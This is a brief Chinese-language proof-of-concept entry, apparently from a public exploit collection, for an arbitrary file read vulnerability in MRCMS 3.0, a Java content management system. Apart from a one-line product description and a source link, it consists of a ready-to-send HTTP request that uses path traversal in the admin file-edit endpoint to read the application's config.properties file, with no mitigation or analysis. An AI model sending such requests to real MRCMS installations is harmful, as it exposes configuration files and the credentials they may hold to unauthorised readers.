## MRCMS3.0任意文件读取漏洞

MRCMS 是一款Java开发的内容管理系统，采用数据模型+模板+插件实现，内置提供了文章模型发布功能。

## 源码
```
https://gitee.com/marker/MRCMS
```

## poc
```
GET /admin/file/edit.do?path=../resources/config.properties&name= HTTP/1.1
Host: 127.0.0.1:8080
Referer: http://127.0.0.1:8080/admin/index.do
Sec-Fetch-Dest: empty
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors
X-Requested-With: XMLHttpRequest
```

![image](https://github.com/wy876/POC/assets/139549762/39dbdc2a-d6d5-481f-b9bb-8bbb0cbac76c)
